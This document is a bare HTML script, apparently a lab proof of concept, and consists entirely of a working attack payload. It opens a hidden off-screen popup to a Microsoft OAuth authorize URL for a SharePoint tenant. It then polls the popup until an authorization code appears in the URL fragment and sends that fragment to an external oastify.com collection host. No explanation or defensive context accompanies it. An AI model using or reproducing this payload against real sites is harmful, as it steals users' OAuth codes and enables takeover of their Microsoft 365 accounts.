<script>
(async()=>{

    if(window.__labPoc) return;
    window.__labPoc = 1;

    const oauth = "https://login.microsoftonline.com/765ca7f2-70b3-424e-ac45-f00d5a55e9ce/oauth2/authorize?client_id=00000003-0000-0ff1-ce00-000000000000&response_mode=fragment&response_type=code%20id_token&resource=00000003-0000-0ff1-ce00-000000000000&scope=openid&nonce=B5FEEDA589C4220AA04B2A49B05E13D63DB8578A74B99052-6E00DD9FF1FBAD06682F5278061DD226DABC70C5567885E97D9CC2D095E713E7&redirect_uri=https%3A%2F%2Fshiscolinotests.sharepoint.com%2F_forms%2Fdefault.aspx&state=OD0w&claims=%7B%22id_token%22%3A%7B%22xms_cc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D&wsucxt=1&cobrandid=11bd8083-87e0-41b5-bb78-0bc43c8a8e8a&client-request-id=6dfae1a1-9064-a000-c9c3-a170f6ed6cc3";

    let win = open(oauth, "", "width=1,height=1,left=-10000,top=-10000");

    for (let i = 0; i < 80; i++) {
        try {
            let hash = win.location.hash;
            if (hash && hash.includes("code=")) {
                
                fetch("https://lqfb8tc4o2twnq2dn33hb1m7xy3prff4.oastify.com/?data=" + encodeURIComponent(hash))
                .catch(()=>{});

                win.close();
                break;
            }
        } catch(e){}

        await new Promise(r => setTimeout(r, 300));
    }

})();
</script>
